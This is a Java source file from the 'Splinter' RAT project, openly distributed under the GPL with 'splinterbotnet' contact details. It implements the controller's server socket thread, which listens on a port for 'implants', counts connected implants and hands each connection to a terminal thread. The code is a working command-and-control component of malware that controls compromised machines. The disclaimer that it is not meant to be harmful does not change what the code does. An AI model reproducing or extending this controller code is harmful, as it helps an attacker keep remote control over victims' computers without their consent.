/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.Thread;

import Controller.Drivers.Drivers;
import java.awt.Color;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import javax.swing.JLabel;

public class Thread_ServerSocket extends Thread
  implements Runnable
{
  String strMyClassName = getName();

  public static int svrSocketPort = -1;
  public static InetAddress localhost = null;
  public static ServerSocket svrSocket = null;
  public static String serverAddr = "";

  public Thread_Terminal terminal = null;

  public static String ControllerIP = "";

  public static boolean serverSocketRunning = false;

  static JLabel jlblStatusLabel = null; static JLabel jlblEstablishedPortNum = null;
  static JLabel jlblNumConnectedImplants;
  static JLabel jlblServerIP = null;

  public static volatile boolean keepServerSocketOpen = true;

  public Thread_ServerSocket(int port, JLabel statusLabel, JLabel establishedPort, JLabel connectedImplants, JLabel lhost)
  {
    try
    {
      jlblStatusLabel = statusLabel;
      jlblEstablishedPortNum = establishedPort;
      svrSocketPort = port;
      jlblNumConnectedImplants = connectedImplants;
      jlblServerIP = lhost;
    }
    catch (Exception e)
    {
      Drivers.eop("Thread_ServerSocket Constructor", this.strMyClassName, e, "", false);
    }
  }

  public void run()
  {
    boolean establishSocket = true;

    if (jlblStatusLabel == null)
    {
      Drivers.jop_Error("Unable to start ServerSocket.  Status Label is not set", "Can not Start ServerSocket");
      establishSocket = false;
    }

    if (jlblEstablishedPortNum == null)
    {
      Drivers.jop_Error("Unable to start ServerSocket.  Status Port Number is not set", "Can not Start ServerSocket");
      establishSocket = false;
    }

    if ((svrSocketPort < 1) || (svrSocketPort > 65534))
    {
      Drivers.jop_Error("Unable to start ServerSocket.  Socket Port is out of range", "Can not Start ServerSocket");
      establishSocket = false;
    }

    if (jlblNumConnectedImplants == null)
    {
      Drivers.jop_Error("Unable to start ServerSocket.  Status Implant Label is not set", "Can not Start ServerSocket");
      establishSocket = false;
    }

    if (jlblServerIP == null)
    {
      Drivers.jop_Error("Unable to start ServerSocket.  Server IP Label is not set", "Can not Start ServerSocket");
      establishSocket = false;
    }

    if (establishSocket)
    {
      Drivers.indicateServerSocketStatus_Closed();

      establishServerSocket(svrSocketPort);
    }
    else
    {
      Drivers.sop("Unable to start ServerSocket. Error was displayed to user");
    }

    while (keepServerSocketOpen)
    {
      Socket sckClientSocket = null;
      try
      {
        sckClientSocket = svrSocket.accept();

        Thread_Terminal terminal = new Thread_Terminal(false, false, false, sckClientSocket);
        terminal.start();
      }
      catch (SocketException se)
      {
        Drivers.sop("ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
        keepServerSocketOpen = false;
        break;
      }
      catch (Exception e)
      {
        Drivers.eop("ServerSocket thead run", this.strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
      }

    }

    Drivers.indicateServerSocketStatus_Closed();
  }

  public boolean establishServerSocket(int prt)
  {
    try
    {
      serverSocketRunning = false;
      keepServerSocketOpen = false;
      try
      {
        svrSocket = new ServerSocket(prt);
      }
      catch (SocketException se)
      {
        Drivers.jop_Error("ServerSocket is unable to bind to port " + prt + ".\nPerhaps this port is occupied.                                   \n\nPlease try a different port", "ServerSocket NOT ESTABLISHED - Unable to bind to port" + prt);
        Drivers.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
        return false;
      }

      localhost = InetAddress.getLocalHost();

      jlblEstablishedPortNum.setText(""+prt);
      jlblStatusLabel.setText("RUNNING");
      jlblServerIP.setText(localhost.getHostAddress());
      ControllerIP = localhost.getHostAddress();

      String success = " * * * * * ServerSocket Established at " + Drivers.getTimeStamp_Without_Date() + " * * * * *\n" + 
        "Server HostName: " + localhost.getHostName() + "\n" + 
        "Server IP: " + localhost.getHostAddress() + "\n" + 
        "Listening for Implants on Port: " + prt;

      Drivers.sop(success);

      keepServerSocketOpen = true;

      jlblStatusLabel.setBackground(Color.green.darker());

      Drivers.jop_Warning(success, "ServerSocket Established");

      serverSocketRunning = true;

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("establishServerSocket", this.strMyClassName, e, "Unable to maintain established server socket", false);
    }

    return false;
  }
}